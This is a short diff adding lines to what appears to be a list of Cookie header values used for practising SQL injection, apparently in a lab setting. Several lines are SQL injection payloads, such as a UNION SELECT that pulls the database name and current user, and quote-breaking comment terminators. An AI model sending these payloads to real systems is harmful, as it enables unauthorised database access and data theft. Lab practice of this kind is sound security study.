@@ -21,3 +21,10 @@ Cookie:superman
 Cookie:
 Cookie:') union select 1, database(), current_user #
 Cookie:admin
+Cookie:admin
+Cookie:admin
+Cookie:
+Cookie:admin
+Cookie:admin
+Cookie:admin1234') union  select 1,2,3#
+Cookie:admin1234ssssss')#
